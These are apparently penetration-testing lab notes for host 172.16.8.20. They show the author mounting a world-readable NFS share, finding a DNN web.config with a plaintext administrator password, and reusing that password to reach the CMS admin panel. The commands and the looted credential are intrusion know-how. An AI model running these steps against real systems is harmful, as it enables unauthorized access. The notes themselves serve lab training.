## 172.16.8.20

#### 2049 (NFS)
WE SEE  the port 2049 is open for nsf mounted  files and we will enum if we will accesss any files and if we will find any sentesife  public accessed files 

 first let see   **which folder** has the server **available** to mount
```bash
showmount -e 172.16.8.20    
Export list for 172.16.8.20:
/DEV01 (everyone)
```
so avery one can can mount   `/DEV01` . let mount it to our attack machien
```bash
sudo mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01 -o nolock
```
now let  list the folder mounted 
```bash
cd /tmp/DEV01 
.
├── BuildPackages.bat
├── CKEditorDefaultSettings.xml
├── CKToolbarButtons.xml
├── CKToolbarSets.xml
├── DNN
│   ├── App_LocalResources
│   │   ├── Browser.aspx.de-DE.resx

<SNIP>

│   ├── web.Deploy.config
│   ├── web.Release.config
│   └── web.config
├── WatchersNET.CKEditor.sln
└── flag.txt
```
we see intesting file ` web.config` it look like the config file for the webiste `DNN`,  
 i reead the file content 
 ```xml
 cat DNN/web.config                                                                 
<?xml version="1.0"?>
<configuration>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.2" />
      </system.Web>
  -->
  <username>Administrator</username>
  <password>
	<value>D0tn31Nuk3R0ck$$@123</value>
  </password>
  <system.web>
    <compilation debug="true" targetFramework="4.5.2"/>
    <httpRuntime targetFramework="4.5.2"/>
  </system.web>
 ```
it look like a credentials  `Administrator:D0tn31Nuk3R0ck$$@123`  to for  the `DNN `  cmd website . 

we notice that the  host `172.16.8.20 ` have  a port `80` open and it serve  `DNN cms `so  we will test this  creds on this web server i

##### 80 (DNN)
by opening   the website http://172.16.8.20/  and entre the login bottn then wntre the creds `Administrator:D0tn31Nuk3R0ck$$@123` we find it in the nfs `DEV01` mounted folder

![[Pasted image 20260214150511.png]]
we successfully access the DNN administrator  panel 